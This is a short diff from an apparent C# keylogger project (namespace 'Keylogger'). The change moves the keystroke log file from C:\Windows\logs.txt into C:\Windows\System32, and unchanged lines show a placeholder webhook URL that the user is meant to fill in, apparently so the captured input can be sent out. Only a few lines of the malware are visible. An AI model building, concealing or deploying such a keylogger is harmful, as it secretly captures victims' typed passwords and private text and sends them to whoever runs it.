@@ -16,7 +16,7 @@ namespace Keylogger
         static void Main(string[] args)
         {
             string webhookUrl = "YOUR-WEBHOOK-URL-HERE";
-            string filePath = @"C:\Windows\logs.txt"; //Path to the log file... You can also rename the "log.txt" to whatever you want.
+            string filePath = @"C:\Windows\System32\logs.txt"; //Path to the log file... You can also rename the "log.txt" to whatever you want.
 
             if (!Directory.Exists(Path.GetDirectoryName(filePath)))
             {
